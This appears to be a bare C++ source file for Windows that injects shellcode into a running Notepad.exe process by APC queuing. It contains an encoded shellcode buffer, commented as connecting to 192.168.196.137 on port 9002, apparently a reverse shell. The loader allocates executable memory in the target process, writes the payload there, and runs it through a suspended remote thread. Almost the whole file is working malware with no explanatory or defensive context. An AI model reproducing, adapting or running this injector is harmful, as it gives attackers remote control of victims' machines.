#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <vector>

//host 192.168.196.137 , port 9002
unsigned char buf[] =
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xd1\x9f\xf7\x03\x2e\x2b\xf8\x3a\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x2d\xd7\x74"
"\xe7\xde\xc3\x38\x3a\xd1\x9f\xb6\x52\x6f\x7b\xaa\x6b\x87"
"\xd7\xc6\xd1\x4b\x63\x73\x68\xb1\xd7\x7c\x51\x36\x63\x73"
"\x68\xf1\xd7\x7c\x71\x7e\x63\xf7\x8d\x9b\xd5\xba\x32\xe7"
"\x63\xc9\xfa\x7d\xa3\x96\x7f\x2c\x07\xd8\x7b\x10\x56\xfa"
"\x42\x2f\xea\x1a\xd7\x83\xde\xa6\x4b\xa5\x79\xd8\xb1\x93"
"\xa3\xbf\x02\xfe\xa0\x78\xb2\xd1\x9f\xf7\x4b\xab\xeb\x8c"
"\x5d\x99\x9e\x27\x53\xa5\x63\xe0\x7e\x5a\xdf\xd7\x4a\x2f"
"\xfb\x1b\x6c\x99\x60\x3e\x42\xa5\x1f\x70\x72\xd0\x49\xba"
"\x32\xe7\x63\xc9\xfa\x7d\xde\x36\xca\x23\x6a\xf9\xfb\xe9"
"\x7f\x82\xf2\x62\x28\xb4\x1e\xd9\xda\xce\xd2\x5b\xf3\xa0"
"\x7e\x5a\xdf\xd3\x4a\x2f\xfb\x9e\x7b\x5a\x93\xbf\x47\xa5"
"\x6b\xe4\x73\xd0\x4f\xb6\x88\x2a\xa3\xb0\x3b\x01\xde\xaf"
"\x42\x76\x75\xa1\x60\x90\xc7\xb6\x5a\x6f\x71\xb0\xb9\x3d"
"\xbf\xb6\x51\xd1\xcb\xa0\x7b\x88\xc5\xbf\x88\x3c\xc2\xaf"
"\xc5\x2e\x60\xaa\x4a\x90\x5c\x8b\x08\x8e\xac\xc5\x03\x2e"
"\x6a\xae\x73\x58\x79\xbf\x82\xc2\x8b\xf9\x3a\xd1\xd6\x7e"
"\xe6\x67\x97\xfa\x3a\xf2\xb5\x37\xab\xea\xa2\xb9\x6e\x98"
"\x16\x13\x4f\xa7\xda\xb9\x80\x9d\xe8\xd1\x04\xd1\xfe\xb4"
"\xb3\x3b\xf7\xf6\x02\x2e\x2b\xa1\x7b\x6b\xb6\x77\x68\x2e"
"\xd4\x2d\x6a\x81\xd2\xc6\xca\x63\x1a\x38\x72\x2e\x5f\xbf"
"\x8a\xec\x63\x07\xfa\x99\x16\x36\x42\x94\xc1\xf7\xe5\x31"
"\x60\x22\x4b\xa7\xec\x92\x2a\x90\xc7\xbb\x8a\xcc\x63\x71"
"\xc3\x90\x25\x6e\xa6\x5a\x4a\x07\xef\x99\x1e\x33\x43\x2c"
"\x2b\xf8\x73\x69\xfc\x9a\x67\x2e\x2b\xf8\x3a\xd1\xde\xa7"
"\x42\x7e\x63\x71\xd8\x86\xc8\xa0\x4e\x1f\xeb\x92\x37\x88"
"\xde\xa7\xe1\xd2\x4d\x3f\x7e\xf5\xcb\xf6\x02\x66\xa6\xbc"
"\x1e\xc9\x59\xf7\x6b\x66\xa2\x1e\x6c\x81\xde\xa7\x42\x7e"
"\x6a\xa8\x73\x2e\x5f\xb6\x53\x67\xd4\x30\x77\x58\x5e\xbb"
"\x8a\xef\x6a\x42\x43\x1d\xa0\x71\xfc\xfb\x63\xc9\xe8\x99"
"\x60\x3d\x88\x20\x6a\x42\x32\x56\x82\x97\xfc\xfb\x90\x08"
"\x8f\x73\xc9\xb6\xb9\x88\xbe\x45\xa7\x2e\x4a\xbf\x80\xea"
"\x03\xc4\x3c\xad\x95\x77\xf8\xce\x5e\xfd\x81\x96\x8c\x85"
"\x6c\x44\x2b\xa1\x7b\x58\x45\x08\xd6\x2e\x2b\xf8\x3a";



bool finder(DWORD* p, HANDLE* hproc, std::vector<DWORD>* thid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snap, &pe)) {
        while (Process32Next(snap, &pe)) {
            if (wcscmp(pe.szExeFile, L"Notepad.exe") == 0) {
                *p = pe.th32ProcessID;
                *hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                break;
            }
        }
    }

    THREADENTRY32 th{};
    th.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(snap, &th)) {
        while (Thread32Next(snap, &th)) {
            if (pe.th32ProcessID == th.th32OwnerProcessID) {
                thid->push_back(th.th32ThreadID);
            }
        }
    }

    return true;
}

void junk() {
    int i = 0; int j= 0;i = j + 2;
}


int main() {
    HANDLE hthread = NULL;
    DWORD pid = 0;
    HANDLE hproc = NULL;
    PVOID mem = NULL;
    std::vector<DWORD> threadIds;

    BOOL f = finder(&pid, &hproc, &threadIds);

    mem = VirtualAllocEx(hproc, 0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        std::cerr << "Memory allocation failed." << std::endl;
        return 1;
    }
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)mem;
    std::wcout << mem<<'\n';
    WriteProcessMemory(hproc, mem, buf, sizeof(buf), 0);
    DWORD ti=0;
    hthread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)&junk, 0, CREATE_SUSPENDED, &ti);

    QueueUserAPC((PAPCFUNC)apcRoutine, hthread, 0);
    
    std::wcout << "enter??";
    getchar();
    ResumeThread(hthread);
    WaitForSingleObject(hthread, INFINITE);

    /*for (DWORD t : threadIds) {
        hthread = OpenThread(THREAD_ALL_ACCESS, FALSE, t);
        QueueUserAPC((PAPCFUNC)apcRoutine, hthread, 0);
        SleepEx(1000*3,TRUE);
    }*/

    
    return 0;
}
